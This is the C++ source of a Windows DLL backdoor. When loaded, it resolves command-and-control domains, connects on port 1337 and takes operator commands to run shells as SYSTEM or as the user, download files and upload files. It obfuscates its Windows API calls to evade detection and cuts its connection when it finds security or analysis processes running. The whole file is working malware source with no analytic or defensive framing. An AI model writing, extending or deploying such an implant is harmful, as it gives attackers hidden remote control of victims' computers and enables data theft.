#include <iostream>
#include <WS2tcpip.h>
#include <windows.h>
#include "AutoHandle.h"
#include "TCPClient.h"
#include "utils.h"
#include "commands.h"
#include "obfuscate.h"
#include "config.h"
#include <algorithm>

bool is_there_a_threat() {
    create_toolhelp_snapshot_type create_toolhelp_snapshot = WINAPI_OBFUSCATE(create_toolhelp_snapshot_type, "CreateToolhelp32Snapshot", "kernel32");
    process32_first_type process32_first = WINAPI_OBFUSCATE(process32_first_type, "Process32First", "kernel32");
    process32_next_type process32_next = WINAPI_OBFUSCATE(process32_next_type, "Process32Next", "kernel32");
    close_handle_type close_handle = WINAPI_OBFUSCATE(close_handle_type, "CloseHandle", "kernel32");

    AutoHandle hSnapshot = create_toolhelp_snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (process32_first(hSnapshot, &pe32)) {
        do {
            std::string name = std::string(reinterpret_cast<char*>(pe32.szExeFile));
            std::transform(name.begin(), name.end(), name.begin(), ::tolower); // to lower
            for (const std::string& process_name : THREAT_PROCESSES) {
                if (name == process_name) {
                    return true;
                }
            }
        } while (process32_next(hSnapshot, &pe32));
    }
    return false;
}


DWORD close_client_on_threats(LPVOID client_pointer) {
    const auto client = reinterpret_cast<TCPClient*>(client_pointer);
    while (client->m_is_connected) {
        if (is_there_a_threat()) {
            client->disconnect();
            return 0;
        }
    }
    return 0;
}


void get_command(TCPClient* client) {
    create_thread_type create_thread = WINAPI_OBFUSCATE(create_thread_type, "CreateThread", "kernel32");
    get_module_handle_type get_module_handle = WINAPI_OBFUSCATE(get_module_handle_type, "GetModuleHandleW", "kernel32");
    free_library_and_exit_thread_type free_library_and_exit_thread = WINAPI_OBFUSCATE(free_library_and_exit_thread_type, "FreeLibraryAndExitThread", "kernel32");
    client->reconnect();
    create_thread(nullptr, 0, close_client_on_threats, client, 0, 0);
    while (client->m_is_connected) {
        const auto data = client->receive(4);
        switch ((*data)[0]) {
        case 0: // Exit
            free_library_and_exit_thread(get_module_handle(nullptr), 0);
            break;
        case 1: // ping
            handle_ping_command(*client);
            break;
        case 2: // Execute shell as SYSTEM
            handle_shell_command(*client);
            break;
        case 3: // Execute as user
            handle_shell_command_as_user(*client);
            break;
        case 4:
            download_file(*client);
            break;
        case 5:
            upload_file(*client);
            break;
        default:
            client->send_data(OBFUSCATE("Unknown command"));
            client->disconnect();
            break;
        }
    }
    client->disconnect();
}

DWORD dll_main(LPVOID param) {
    initilize_winapi();
    sleep_type sleep = WINAPI_OBFUSCATE(sleep_type, "Sleep", "kernel32");
    create_mutex_a_type create_mutex_a = WINAPI_OBFUSCATE(create_mutex_a_type, "CreateMutexA", "kernel32");
    wait_for_single_object_type wait_for_single_object = WINAPI_OBFUSCATE(wait_for_single_object_type, "WaitForSingleObject", "kernel32");

    AutoHandle mutex = create_mutex_a(0, false, MUTEX_NAME);
    if (nullptr == mutex) {
        return 0;
    }
    wait_for_single_object(mutex, INFINITE);
    std::string cnc_ip = "";
    while (cnc_ip == "") {
        for (const std::string& domain : CNC_DOMAINS) {
            cnc_ip = domain_to_ip(domain.c_str());
            if (cnc_ip != "") {
                break;
            }
        }
        sleep(1000 * 10);
    }
    TCPClient client(cnc_ip.c_str(), 1337);
    // Command handler:
    while (1) {
        try {
            if (!is_there_a_threat()) {
                get_command(&client);
            }
        } catch (...) {
            sleep(1000 * SLEEP_BETWEEN_COMMANDS);
        }
    }
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        CreateThread(nullptr, 0, dll_main, nullptr, 0, 0);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}